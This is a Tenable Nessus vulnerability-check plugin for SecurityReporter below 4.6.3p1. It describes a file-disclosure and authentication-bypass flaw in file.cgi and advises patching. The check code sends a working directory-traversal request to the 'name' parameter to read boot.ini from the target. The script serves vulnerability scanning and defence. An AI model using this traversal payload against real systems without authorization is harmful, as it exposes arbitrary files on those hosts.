#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(25994);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2007-3985", "CVE-2007-3986");
  script_bugtraq_id(25027);
  script_xref(name:"OSVDB", value:"43770");
  script_xref(name:"OSVDB", value:"45811");

  script_name(english:"SecurityReporter < 4.6.3p1 Multiple Vulnerabilities");
  script_summary(english:"Tries to retrieve a local file using SecurityReporter");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI application that is affected by
multiple issues." );
 script_set_attribute(attribute:"description", value:
"The 'file.cgi' script included with the version of SecurityReporter
installed on the remote host fails to sanitize input to the 'name'
parameter before returning the contents of the specified file and
supports bypassing authentication using specially-crafted arguments. 
An unauthenticated remote attacker can exploit these issues to
retrieve the contents of arbitrary files on the remote host. 

In addition, 'file.cgi' allows an attacker to bypass authentication
using a specially-crafted 'name' parameter. 

Note that SecurityReporter is also known as 'Network Security
Analyzer' and is included in products from eIQnetworks, Top Layer
Networks, Clavister, Astaro, Reflex Security, H3C, Piolink, and
MiraPoint." );
 script_set_attribute(attribute:"see_also", value:"http://www.oliverkarow.de/research/securityreporter.txt" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/474472/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to version 4.6.3 if necessary and then apply SecurityReporter
v4.6.3 patch 1.  Or contact the vendor for a patch." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "web_traversal.nasl");
  script_require_ports("Services/www", 8216, 9216);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8216);
if (!get_port_state(port)) exit(0);
if ( get_kb_item(strcat("www/", port, "/generic_traversal"))) exit(0);


# Try to exploit the issue to retrieve a file.
file = "boot.ini";

dirs = cgi_dirs();
foreach dir (dirs)
{
  url = strcat(dir, "/file.cgi?",
    "name=/eventcache/../../../../../../../../../../../", file);
  req = http_get(item: url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if looks like boot.ini.
  if ("[boot loader]">< res)
  {
    report = string(
      "\n",
      "Here are the contents of the file '\\boot.ini' that Nessus\n",
      "was able to read from the remote host through\n",
      build_url(port: port, qs: url),
      "\n",
      res
    );
    security_warning(port:port, extra:report);
    exit(0);
  }
}
